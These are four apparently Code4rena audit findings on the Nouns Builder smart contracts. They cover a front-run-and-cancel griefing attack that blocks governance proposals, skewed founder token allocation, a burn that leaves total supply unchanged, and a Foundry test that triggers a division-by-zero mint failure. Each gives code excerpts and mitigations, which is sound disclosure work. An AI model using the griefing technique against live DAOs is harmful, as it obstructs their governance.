# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L151 https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L353-L377   # Vulnerability details  When creating a new governance proposal, the `proposalId` is generated by hashing the proposal data (`_targets, _values, _calldatas, descriptionHash`). To prevent duplicated proposals, the current `Governor` implementation checks if the `proposalId` exists already. If it exists, the call will revert with the `PROPOSAL_EXISTS` error.  ## Impact  Anyone can prevent others from creating governance proposals by front-running the create proposal transaction with the same data, followed by an immediate call to the `Governor.cancel` function.  This will prevent creating a proposal with the same proposal data. A proposal creator would have to slightly change the proposal to try to create it again (however, it can be prevented again due to the aforementioned issue)  ## Proof of Concept  [governance/governor/Governor.propose](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L151)  ```solidity function propose(     address[] memory _targets,     uint256[] memory _values,     bytes[] memory _calldatas,     string memory _description ) external returns (bytes32) {     [..]      // Compute the description hash     bytes32 descriptionHash = keccak256(bytes(_description));      // Compute the proposal id     bytes32 proposalId = hashProposal(_targets, _values, _calldatas, descriptionHash);      // Get the pointer to store the proposal     Proposal storage proposal = proposals[proposalId];      // Ensure the proposal doesn't already exist     if (proposal.voteStart != 0) revert PROPOSAL_EXISTS(proposalId); // @audit-info Reverts in case the proposals with the same data exists already      [..] } ```  [governance/governor/Governor.cancel](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L353-L377)  Cancelling a proposal updates the `proposal.canceled` boolean property to `true`. `proposal.voteStart` is left unchanged (`!= 0`).  ```solidity /// @notice Cancels a proposal /// @param _proposalId The proposal id function cancel(bytes32 _proposalId) external {     // Ensure the proposal hasn't been executed     if (state(_proposalId) == ProposalState.Executed) revert PROPOSAL_ALREADY_EXECUTED();      // Get a copy of the proposal     Proposal memory proposal = proposals[_proposalId];      // Cannot realistically underflow and `getVotes` would revert     unchecked {         // Ensure the caller is the proposer or the proposer's voting weight has dropped below the proposal threshold         if (msg.sender != proposal.proposer && getVotes(proposal.proposer, block.timestamp - 1) > proposal.proposalThreshold)             revert INVALID_CANCEL();     }      // Update the proposal as canceled     proposals[_proposalId].canceled = true;      // If the proposal was queued:     if (settings.treasury.isQueued(_proposalId)) {         // Cancel the proposal         settings.treasury.cancel(_proposalId);     }      emit ProposalCanceled(_proposalId); } ```  ## Tools Used  Manual review  ## Recommended mitigation steps  Consider adding a per-account nonce storage variable (e.g. `mapping(address => uint256) internal proposalCreatorNonces;` to the `Governor` contract and include the `proposalCreatorNonces[msg.sender]++` nonce within the computed proposal id. 
# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/debe9b792cc70510eadf9b3728cde5b0f2ec9a1f/src/token/Token.sol#L110   # Vulnerability details  ## Impact Because of the "greedy" minting scheme for founders (tokens to founders are minted until `_isForFounder` returns `false`, i.e. until there is an unset `tokenRecipient[tokenId % 100]`), it can happen that the actual percentages of tokens that the founders receive deviate significantly from the desired percentages:  ##  Proof Of Concept Imagine we are in a situation where one founder has a 51% share and the other a 48% share. Because `schedule` is set to 1 for the first founder, `tokenRecipient[0] ... tokenRecipient[50]` will be set to his address. `tokenRecipient[51], tokenRecipient[53], ...` is set to the address of the second founder. Now let's say a mint happens just before the `vestExpiry` and when `tokenId % 100 == 0`. In such a situation, founder 1 will get 51 tokens (because of the consecutive entries in `tokenRecipients`) and founder 2 will get 1 token (because of the entry in `tokenRecipient[51]`, which is also consecutive. Let's say that the next mint happens after the vest expiration, which means that no founders get additional tokens.  In such a situation, founder 1 got 51 of the "last 100" token IDs, whereas founder 2 only got 1. Therefore, the overall percentage of tokens that those founders got will not be 51% and 40%. When the vest expiration was set to a time far in the future, it will be close to it, but when the vest timespan was only short, it can be very bad. In the extreme case where the expiration is set such that only 1 mint call causes mints for founders, founder 1 will have 51 tokens and founder 2 only 1, meaning the percentages are 51% / 1% instead of 51% / 48%!  ## Recommended Mitigation Steps Consider using another distribution scheme. Instead of the current "greedy" scheme (minting until a slot is free), it would make sense to mint the tokens for the founders every 100 tokens, i.e. everytime when `tokenId % 100 == 0`. Like that, it is ensured that the actual percentages are equal to the desired percentages.
# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/Token.sol#L71-L126 https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/Token.sol#L154 https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/Token.sol#L207-L213   # Vulnerability details  ## Impact According to nouns builder, founder can have percentage of created nft. This is set in `Token::_addFounders` function.  When new nft is minted by `mint` function then total supply of tokens is incremented and assigned to tokenId using `tokenId = settings.totalSupply++`. Then this token is checked if it should be mint to founder(then again increment total supply of tokens) or should be mint to auction using `while (_isForFounder(tokenId))`.  If token wasn't sold during the auction then auction burns it using `burn` function. And this function doesn't decrement `settings.totalSupply` value. But total supply **has changed** now, it has decreased by one.  So suppose that we have 1 founder of dao that should receive 2% of nft, that means that if 100 nft are available(for example), then 2 of them belongs to that founder. If we have minted 100 nft and 10 of them were not sold(they were then burned), then there are 90 nft available now. And in current implementation founder has ownership of 2 of them, however **2 is not 2% of 90**. So in case when nft are not sold on auction the percentage of founder's tokens is increasing and the increasing speed depends on how many tokens were not sold. Also founder gets more power in the community(as he has more percentage now).   ## Proof of Concept https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/Token.sol#L71-L126 https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/Token.sol#L154 https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/Token.sol#L207-L213  ## Tools Used  ## Recommended Mitigation Steps When `burn` function is called then do `settings.totalSupply--`.
# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/metadata/MetadataRenderer.sol#L194   # Vulnerability details  ## Impact It is not possible to mint a ERC721 token if its properties has different length than it's items.  ## Proof of Concept  I run the following test to reproduce the error:          deployMock();          vm.prank(address(governor));         string[] memory _names = new string[](1);         _names[0] = "propertyName"; //fill _names with some value         MetadataRendererTypesV1.ItemParam[] memory _items; //define empty array                  MetadataRendererTypesV1.IPFSGroup memory _ipfsGroup;          _ipfsGroup.baseUri = "";         _ipfsGroup.extension = "";         MetadataRenderer(token.metadataRenderer()).addProperties(_names, _items, _ipfsGroup); //call add property with _items array empty.          vm.stopPrank();         vm.prank(address(auction));          uint256 success = token.mint();//error happens inside here         assert(success != 0);          vm.stopPrank();           Log from Foundry console:      â”œâ”€ [736] TOKEN::metadataRenderer() [staticcall]     â”‚   â”œâ”€ [353] Token::metadataRenderer() [delegatecall]     â”‚   â”‚   â””â”€ â† METADATA_RENDERER: [0x7076fd06ec2d09d4679d9c35a8db81ace7a07ee2]     â”‚   â””â”€ â† METADATA_RENDERER: [0x7076fd06ec2d09d4679d9c35a8db81ace7a07ee2]     â”œâ”€ [78618] METADATA_RENDERER::addProperties(["propertyName"], [], ("", ""))     â”‚   â”œâ”€ [78172] MetadataRenderer::addProperties(["propertyName"], [], ("", "")) [delegatecall]     â”‚   â”‚   â”œâ”€ emit OwnerUpdated(prevOwner: FOUNDER: [0xd3562fd10840f6ba56112927f7996b7c16edfcc1], newOwner: TREASURY: [0xf8cf955543f1ce957b81c1786be64d5fc96ad7b5])           â”‚   â”‚   â”œâ”€ emit PropertyAdded(id: 0, name: "propertyName")     â”‚   â”‚   â””â”€ â† ()     â”‚   â””â”€ â† ()     â”œâ”€ [0] VM::stopPrank()     â”‚   â””â”€ â† ()     â”œâ”€ [0] VM::prank(AUCTION: [0x9a1450e42d752b8731bc88f20dbaa9154642f1e6])     â”‚   â””â”€ â† ()     â”œâ”€ [121037] TOKEN::mint()     â”‚   â”œâ”€ [120650] Token::mint() [delegatecall]     â”‚   â”‚   â”œâ”€ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: FOUNDER: [0xd3562fd10840f6ba56112927f7996b7c16edfcc1], tokenId: 0)     â”‚   â”‚   â”œâ”€ emit DelegateVotesChanged(delegate: FOUNDER: [0xd3562fd10840f6ba56112927f7996b7c16edfcc1], prevTotalVotes: 0, newTotalVotes: 1)     â”‚   â”‚   â”œâ”€ [25762] METADATA_RENDERER::onMinted(0)     â”‚   â”‚   â”‚   â”œâ”€ [25372] MetadataRenderer::onMinted(0) [delegatecall]     â”‚   â”‚   â”‚   â”‚   â””â”€ â† "Division or modulo by 0"     â”‚   â”‚   â”‚   â””â”€ â† "Division or modulo by 0"     â”‚   â”‚   â””â”€ â† "Division or modulo by 0"     â”‚   â””â”€ â† "Division or modulo by 0"     â””â”€ â† "Division or modulo by 0"    ## Tools Used Foundry Manual  ## Recommended Mitigation Steps It could be mitigated checking length of both arrays in MetadataRenderer.addProperties() method.  It could be done after those lines: https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/metadata/MetadataRenderer.sol#L111-L115  Also I recommend to move those declaration and new validation at the beginning to save gas.
